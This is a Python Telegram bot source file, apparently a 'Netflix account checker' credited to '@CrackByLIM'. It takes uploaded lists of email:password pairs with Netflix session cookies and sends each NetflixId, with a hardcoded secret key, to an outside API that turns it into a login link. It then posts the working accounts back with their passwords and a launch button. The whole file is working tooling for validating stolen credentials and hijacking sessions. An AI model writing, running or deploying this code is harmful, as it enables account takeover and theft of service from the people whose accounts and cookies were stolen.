import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
import time
from collections import defaultdict
import re
import asyncio

# Configuration
TOKEN = os.environ.get('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found in environment variables!")
    exit(1)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email):
    """Check if Netflix ID is valid by calling the API"""
    try:
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(url, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            return {
                "success": False,
                "error": result.get('error', 'Unknown error'),
                "error_code": result.get('error_code', 'UNKNOWN_ERROR'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== FILE PARSING ====================

def parse_account_line(line):
    """Parse a single line from the accounts file"""
    try:
        line = line.strip()
        if not line or line.startswith('#'):
            return None
        
        account = {}
        
        # Extract email:password
        email_pass_match = re.match(r'^([^:]+):([^\s|]+)', line)
        if email_pass_match:
            account['email'] = email_pass_match.group(1).strip()
            account['password'] = email_pass_match.group(2).strip()
        else:
            return None
        
        # Extract Netflix Cookies
        cookie_match = re.search(r'NetflixCookies\s*=\s*(NetflixId=[^\s|]+)', line)
        if cookie_match:
            account['cookie'] = cookie_match.group(1).strip()
            # Extract NetflixId
            netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_match.group(1))
            if netflix_id_match:
                account['netflix_id'] = netflix_id_match.group(1).strip()
        
        # Extract other fields (optional)
        fields = {
            'country': r'Country\s*=\s*([^|\n]+)',
            'plan': r'Plan\s*=\s*([^|\n]+)',
            'video_quality': r'VideoQuality\s*=\s*([^|\n]+)',
            'max_streams': r'MaxStreams\s*=\s*([^|\n]+)',
        }
        
        for key, pattern in fields.items():
            match = re.search(pattern, line)
            if match:
                account[key] = match.group(1).strip()
        
        return account
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎬 **NETFLIX ACCOUNT CHECKER PRO** 🎬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👋 **Welcome, {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Required Format:**
`email:password | NetflixCookies = NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Features:**
✅ Professional processing screen
✅ All valid accounts sent after scan
✅ Premium login links with buttons

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆘 **HELP & INSTRUCTIONS** 🆘
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📁 **STEP 1: PREPARE FILE**
• Create a `.txt` file
• One account per line
• Must include NetflixCookies

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **EXAMPLE:**
`user@email.com:pass123 | NetflixCookies = NetflixId=v%3D3%26ct%3D...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **STEP 2: UPLOAD**
• Send the file to this chat
• Bot will process all accounts
• Valid accounts sent after scan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **GLOBAL STATISTICS** 📊
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 **Performance:**
• **Total Checks:** `{total_checks}`
• **✅ Valid Found:** `{valid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **SESSION CLEARED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You can now upload a new file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text("⏰ Rate limit exceeded. Please wait a minute.")
        return
    
    # Check if it's a document
    if not update.message.document:
        return
    
    document = update.message.document
    
    # Check file extension
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    # Send initial message
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines
        lines = content.split('\n')
        valid_lines = [l.strip() for l in lines if l.strip() and not l.startswith('#')]
        
        if not valid_lines:
            await status_msg.edit_text("❌ No valid accounts found in file.")
            return
        
        await status_msg.edit_text(f"📊 Processing {len(valid_lines)} accounts...")
        
        # Process accounts
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, line in enumerate(valid_lines, 1):
            try:
                # Parse account
                account = parse_account_line(line)
                if not account or 'netflix_id' not in account:
                    invalid_count += 1
                    continue
                
                # Update progress
                if i % 5 == 0 or i == len(valid_lines):
                    await status_msg.edit_text(f"🔄 Processing: {i}/{len(valid_lines)} (Valid: {valid_count})")
                
                # Check with API
                email = account.get('email', 'Unknown')
                result = await check_netflix_id(account['netflix_id'], email)
                
                # Update stats
                total_checks += 1
                
                if result.get('success'):
                    valid_count += 1
                    valid_accounts += 1
                    valid_accounts_found.append({
                        'email': email,
                        'password': account.get('password', 'N/A'),
                        'login_url': result['login_url'],
                        'country': account.get('country', 'N/A'),
                        'plan': account.get('plan', 'N/A'),
                        'quality': account.get('video_quality', 'N/A'),
                        'streams': account.get('max_streams', 'N/A')
                    })
                else:
                    invalid_count += 1
                
                # Small delay
                await asyncio.sleep(0.5)
                
            except Exception as e:
                logger.error(f"Error processing line {i}: {e}")
                invalid_count += 1
                continue
        
        # Complete
        await status_msg.edit_text(f"✅ Processing complete! Found {valid_count} valid accounts.")
        
        # Send valid accounts
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                msg = f"""
✅ **VALID ACCOUNT #{idx}**

📧 **Email:** `{acc['email']}`
🔑 **Password:** `{acc['password']}`
🌍 **Country:** `{acc['country']}`
📺 **Plan:** `{acc['plan']}`

🔗 **Login Link:** `{acc['login_url']}`

⚡ Powered by {YOUR_CREDIT}
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            
            await update.message.reply_text(f"✅ Sent {valid_count} valid accounts!")
        else:
            await update.message.reply_text("❌ No valid accounts found.")
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION - SIMPLIFIED FOR RAILWAY ====================

def main():
    """Main entry point - simplified for Railway"""
    print("=" * 60)
    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("=" * 60)
    
    # Create application
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Start the bot
    print("✅ Bot is now running! Waiting for messages...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        time.sleep(5)